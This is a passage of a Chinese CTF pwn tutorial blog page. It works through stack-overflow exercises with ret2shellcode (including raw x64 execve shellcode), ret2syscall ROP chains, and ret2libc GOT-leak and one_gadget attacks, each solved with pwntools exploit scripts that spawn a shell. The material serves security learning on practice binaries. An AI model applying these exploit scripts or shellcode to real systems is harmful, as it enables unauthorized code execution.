</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p><img src="/img/2019-03/Snipaste_2019-03-01_11-58-46.png" alt="Snipaste_2019-03-01_11-58-46"></p> <h4 id="x64"><a href="#x64" class="header-anchor">#</a> x64</h4> <blockquote><p>sniperoj-pwn100-shellcode-x86-64分析</p></blockquote> <p>这个题也是常规的栈溢出，然后ret2shellcode即可，需要注意的是，由于栈空间的限制，我们想要ret2shellcode的大小只有24，需要找一个64位下长度小于24的shellcode才能成功。</p> <p><img src="/img/2019-03/Snipaste_2019-03-01_14-50-01.png" alt="Snipaste_2019-03-01_14-50-01"></p> <p>而且由于shellcode都有压栈和出栈操作，而我们的shellcode又正好都在esp的上面，这会导致shellcode被压栈给覆盖，导致shellcode执行失败，需要注意这个问题。
所以我们可以将shellcode放在esp的上面，由于它不会一开始就pop指令，这样就能防止它被覆写，从而getshell。但是这个题输入长度也有限制，一共64，除去填充的32，shellcode的长度要求必须小于32，所以我们选用网上提供的shellcode即可。</p> <p>脚本如下</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>s<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'['</span><span class="token punctuation">)</span>
ret_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">']'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
<span class="token comment"># 23 bytes</span>
<span class="token comment"># https://www.exploit-db.com/exploits/36858/</span>
shellcode_x64 <span class="token operator">=</span> <span class="token string">&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span>
payload <span class="token operator">=</span> <span class="token string">'b'</span> <span class="token operator">*</span> <span class="token number">24</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret_addr <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">+</span> shellcode_x64
s<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p><img src="/img/2019-03/Snipaste_2019-03-01_15-10-03.png" alt="Snipaste_2019-03-01_15-10-03"></p> <h2 id="ret2syscall"><a href="#ret2syscall" class="header-anchor">#</a> ret2syscall</h2> <p>ret2syscall，即控制程序执行系统调用，获取 shell。和ret2libc不一样的是，ret2syscall是不需要用到libc的，这就让我们必须在程序本身中找到gadget，实现<code>system('/bin/sh')</code>或者<code>execve('/bin/sh', NULL, NULL)</code>。这种方式是通过 shell 获取系统调用。所以这种方式一般适合于静态链接的程序。</p> <p>简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">&quot;/bin/sh&quot;</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>其中，该程序是 32 位，所以我们需要使得</p> <ul><li>系统调用号，即 eax 应该为 0xb</li> <li>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</li> <li>第二个参数，即 ecx 应该为 0</li> <li>第三个参数，即 edx 应该为 0</li></ul> <p>所以我们需要通过gadget来控制这4个寄存器。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code>ROPgadget <span class="token operator">--</span>binary <span class="token punctuation">.</span><span class="token operator">/</span>rop <span class="token operator">--</span>only <span class="token string">'pop|ret'</span><span class="token operator">|</span>ag pop
<span class="token number">0x080bb196</span> <span class="token operator">:</span> pop eax <span class="token punctuation">;</span> ret
<span class="token number">0x0806eb90</span> <span class="token operator">:</span> pop edx <span class="token punctuation">;</span> pop ecx <span class="token punctuation">;</span> pop ebx <span class="token punctuation">;</span> ret
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>还要找到sh的地址，和int 0x80的地址。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code>ROPgadget <span class="token operator">--</span>binary <span class="token punctuation">.</span><span class="token operator">/</span>rop <span class="token operator">--</span>string <span class="token string">&quot;/bin/sh&quot;</span>
<span class="token number">0x080be408</span> <span class="token operator">:</span> <span class="token operator">/</span>bin<span class="token operator">/</span>sh

ROPgadget <span class="token operator">--</span>binary <span class="token punctuation">.</span><span class="token operator">/</span>rop <span class="token operator">|</span>ag <span class="token string">&quot;int 0x80&quot;</span>
<span class="token number">0x08049421</span> <span class="token operator">:</span> <span class="token keyword">int</span> <span class="token number">0x80</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>有了这几个gadget之后，我们按照顺序来排布数据，最后再进行系统调用即可getshell。</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>pop_eax_ret <span class="token operator">=</span> <span class="token number">0x080bb196</span>
pop_edx_ecx_ebx_ret <span class="token operator">=</span> <span class="token number">0x0806eb90</span>
int_0x80 <span class="token operator">=</span> <span class="token number">0x08049421</span>
binsh <span class="token operator">=</span> <span class="token number">0x80be408</span>
payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>cyclic<span class="token punctuation">(</span><span class="token number">112</span><span class="token punctuation">)</span><span class="token punctuation">,</span> pop_edx_ecx_ebx_ret<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> binsh<span class="token punctuation">,</span> pop_eax_ret<span class="token punctuation">,</span> <span class="token number">0xb</span><span class="token punctuation">,</span> int_0x80<span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token comment">#payload = shellcode_x64.ljust(24, '\x90') + p64(ret_addr)</span>
s<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p><img src="/img/2019-03/Snipaste_2019-03-01_15-51-26.png" alt="Snipaste_2019-03-01_15-51-26"></p> <h2 id="ret2libc"><a href="#ret2libc" class="header-anchor">#</a> ret2libc</h2> <p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(&quot;/bin/sh&quot;)，故而此时我们需要知道 system 函数的地址。</p> <h3 id="第一题"><a href="#第一题" class="header-anchor">#</a> 第一题</h3> <p>我们需要的一般有2个地址，对于第一个题来说，system和参数地址都提供了，一个在plt表中，一个在bss段中。所以很简单。</p> <p><img src="/img/2019-03/Snipaste_2019-03-01_16-16-28.png" alt="Snipaste_2019-03-01_16-16-28"></p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>objdump <span class="token operator">-</span>d <span class="token operator">-</span>j <span class="token punctuation">.</span>plt <span class="token operator">-</span>M intel <span class="token punctuation">.</span><span class="token operator">/</span>ret2libc1<span class="token operator">|</span>ag @plt
<span class="token number">08048430</span> <span class="token operator">&lt;</span>gets@plt<span class="token operator">&gt;</span><span class="token punctuation">:</span>
<span class="token number">08048440</span> <span class="token operator">&lt;</span>time@plt<span class="token operator">&gt;</span><span class="token punctuation">:</span>
<span class="token number">08048450</span> <span class="token operator">&lt;</span>puts@plt<span class="token operator">&gt;</span><span class="token punctuation">:</span>
<span class="token number">08048460</span> <span class="token operator">&lt;</span>system@plt<span class="token operator">&gt;</span><span class="token punctuation">:</span>
<span class="token number">08048470</span> <span class="token operator">&lt;</span>__gmon_start__@plt<span class="token operator">&gt;</span><span class="token punctuation">:</span>
<span class="token number">08048480</span> <span class="token operator">&lt;</span>srand@plt<span class="token operator">&gt;</span><span class="token punctuation">:</span>
<span class="token number">08048490</span> <span class="token operator">&lt;</span>__libc_start_main@plt<span class="token operator">&gt;</span><span class="token punctuation">:</span>
<span class="token number">080484a0</span> <span class="token operator">&lt;</span>setvbuf@plt<span class="token operator">&gt;</span><span class="token punctuation">:</span>
<span class="token number">080484b0</span> <span class="token operator">&lt;</span>rand@plt<span class="token operator">&gt;</span><span class="token punctuation">:</span>
<span class="token number">080484c0</span> <span class="token operator">&lt;</span>__isoc99_scanf@plt<span class="token operator">&gt;</span><span class="token punctuation">:</span>

ROPgadget <span class="token operator">-</span><span class="token operator">-</span>binary <span class="token punctuation">.</span><span class="token operator">/</span>ret2libc1 <span class="token operator">-</span><span class="token operator">-</span>string <span class="token string">&quot;/bin/sh&quot;</span>
<span class="token number">0x08048720</span> <span class="token punctuation">:</span> <span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>sh
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><p>脚本如下所示：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>system_plt <span class="token operator">=</span> <span class="token number">0x08048460</span>
binsh_addr <span class="token operator">=</span> <span class="token number">0x08048720</span>
payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>cyclic<span class="token punctuation">(</span><span class="token number">112</span><span class="token punctuation">)</span><span class="token punctuation">,</span> system_plt<span class="token punctuation">,</span> <span class="token number">0xdeadbeef</span><span class="token punctuation">,</span> binsh_addr<span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token comment">#payload = shellcode_x64.ljust(24, '\x90') + p64(ret_addr)</span>
s<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p><img src="/img/2019-03/Snipaste_2019-03-01_16-48-15.png" alt="Snipaste_2019-03-01_16-48-15"></p> <h3 id="第二题"><a href="#第二题" class="header-anchor">#</a> 第二题</h3> <p>和第一题差不多，只不过没有bash字符串了，需要手动写入进去，由于aslr的不确定性。我使用的方法布局好栈帧，劫持返回地址到got表中的gets，然后再调用gets，将sh字符串写入bss段中。然后再控制返回地址到system@plt。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code>ROPgadget <span class="token operator">--</span>binary <span class="token punctuation">.</span><span class="token operator">/</span>ret2libc2 <span class="token operator">--</span>only <span class="token string">'pop|ret'</span>
<span class="token number">0x0804872f</span> <span class="token operator">:</span> pop ebp <span class="token punctuation">;</span> ret
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>脚本如下，和第一题差不多，只不过需要注意的是，由于要连续调用2次函数，其中需要一次rop，才能成功布局好栈帧，否则会调用失败。</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>buf_addr <span class="token operator">=</span> <span class="token number">0x0804a068</span>
pop_addr <span class="token operator">=</span> <span class="token number">0x0804872f</span>

payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>cyclic<span class="token punctuation">(</span><span class="token number">112</span><span class="token punctuation">)</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'gets'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> pop_addr<span class="token punctuation">,</span> buf_addr<span class="token punctuation">]</span><span class="token punctuation">)</span>

payload <span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0xdeadbeef</span><span class="token punctuation">,</span> buf_addr<span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token comment">#payload = shellcode_x64.ljust(24, '\x90') + p64(ret_addr)</span>
s<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">&quot;/bin/sh\x00&quot;</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p><img src="/img/2019-03/Snipaste_2019-03-01_17-34-25.png" alt="Snipaste_2019-03-01_17-34-25"></p> <h3 id="第三题"><a href="#第三题" class="header-anchor">#</a> 第三题</h3> <p>在第二题的基础上，再次将 system 函数的地址去掉。此时，我们需要同时找到 system 函数地址与 /bin/sh 字符串的地址。</p> <ul><li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li> <li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集，如下</li> <li><a href="https://github.com/niklasb/libc-database" target="_blank" rel="noopener noreferrer">https://github.com/niklasb/libc-database<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li></ul> <p>所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。</p> <p>那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。<strong>当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。</strong></p> <p>我们自然可以根据上面的步骤先得到 libc，之后在程序中查询偏移，然后再次获取 system 地址，但这样手工操作次数太多，有点麻烦，这里给出一个 libc 的利用工具，具体细节请参考 readme</p> <ul><li><a href="https://github.com/lieanu/LibcSearcher" target="_blank" rel="noopener noreferrer">https://github.com/lieanu/LibcSearcher<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li></ul> <p>此外，在得到 libc 之后，其实 libc 中也是有 /bin/sh 字符串的，所以我们可以一起获得 /bin/sh 字符串的地址。</p> <p>这里我们泄露 __libc_start_main 的地址，这是因为它是程序最初被执行的地方。基本利用思路如下</p> <ul><li>泄露 __libc_start_main 地址</li> <li>获取 libc 版本</li> <li>获取 system 地址与 /bin/sh 的地址</li> <li>再次执行源程序</li> <li>触发栈溢出执行 system(‘/bin/sh’)</li></ul> <div class="language-python line-numbers-mode"><pre class="language-python"><code>s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>cyclic<span class="token punctuation">(</span><span class="token number">112</span><span class="token punctuation">)</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_start'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u32<span class="token punctuation">(</span>s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">&quot;libc.address -&gt; {:#x}&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">assert</span> libc<span class="token punctuation">.</span>address <span class="token operator">&amp;</span> <span class="token number">0xfff</span> <span class="token operator">==</span> <span class="token number">0</span>

s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>cyclic<span class="token punctuation">(</span><span class="token number">112</span><span class="token punctuation">)</span><span class="token punctuation">,</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0xdeadbeef</span><span class="token punctuation">,</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">&quot;/bin/sh&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
<span class="token comment">#s.recv()</span>
s<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><p><img src="/img/2019-03/Snipaste_2019-03-01_18-53-36.png" alt="Snipaste_2019-03-01_18-53-36"></p> <p>当然我之后试了下神器one_gadget，作为217战队的成员开发的一建getshell工具，命令如下。</p> <p><img src="/img/2019-03/Snipaste_2019-03-01_20-15-05.png" alt="Snipaste_2019-03-01_20-15-05"></p> <p>它也提示了我们需要getshell的约束条件，我用的是最后一个，即esi指向libc的GOT表首地址，eax需要为0。由于这个题，第二次gets函数结束后eax就是0，这一个条件就满足了，然后要设置esi的值，这里不是很懂，但是经过调试发现esi的值就是GOT表的首地址，可能是调用got表中的函数之后就会将其值设置成该地址，具体不清楚。然后我们直接返回到libc首地址加偏移量即可。</p> <h3 id="第四题"><a href="#第四题" class="header-anchor">#</a> 第四题</h3> <p>练习题差不多的，主要是最后one_gadget的地址不一样，因为eax不是0，这样我们可以通过设置[esp]=0来getshell。</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>s<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'The address'</span><span class="token punctuation">)</span>
binsh_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
puts_got <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
libc<span class="token punctuation">.</span>address <span class="token operator">=</span> puts_got <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">&quot;libc.address -&gt; {:#x}&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>

payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>cyclic<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x6985c</span> <span class="token operator">+</span> libc<span class="token punctuation">.</span>address<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
s<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div></div> <footer class="page-edit"><!----> <div class="last-updated"><span class="prefix">最后更新时间:</span> <span class="time">2020年5月24日 15:29</span></div></footer> <div class="page-nav"><p class="inner"><span class="prev">
      ←
      <a href="/ctf/pwn/learning-pwn-2.html" class="prev">
        pwn基础学习-2
      </a></span> <span class="next"><a href="/ctf/pwn/learning-pwn-4.html">
        pwn基础学习-4
      </a>
      →
    </span></p></div>  <!----></main></div><div class="global-ui"><!----><!----></div></div>
    <script src="/assets/js/app.e9262f25.js" defer></script><script src="/assets/js/10.8c4e16ac.js" defer></script><script src="/assets/js/3.ccd7177d.js" defer></script><script src="/assets/js/18.9c668a1d.js" defer></script><script src="/assets/js/6.b90dc81c.js" defer></script>
  </body>
</html>
